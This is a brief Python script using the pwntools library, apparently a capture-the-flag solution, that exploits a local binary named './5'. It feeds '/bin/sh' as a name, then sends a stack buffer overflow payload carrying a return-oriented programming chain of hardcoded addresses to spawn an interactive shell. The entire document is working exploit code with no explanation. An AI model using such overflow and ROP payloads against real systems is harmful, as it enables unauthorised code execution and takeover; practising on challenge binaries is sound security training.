from pwn import *

p = process('./5')

context(arch='amd64', os='linux', log_level='debug')

p.sendlineafter(b'if you want to watch demo', b'no')
p.sendlineafter(b'please int your name', b'/bin/sh\x00')

payload = b'\x00'*32+b'a'*(0x58-32) + p64(0x401A18) + p64(0x4040F0) + p64(0x401A21) + p64(0x401C15) + p64(0x401A39)
payload = payload.ljust(0xf0, b'\x00')
p.sendafter(b'please introduce yourself', payload)

p.interactive()
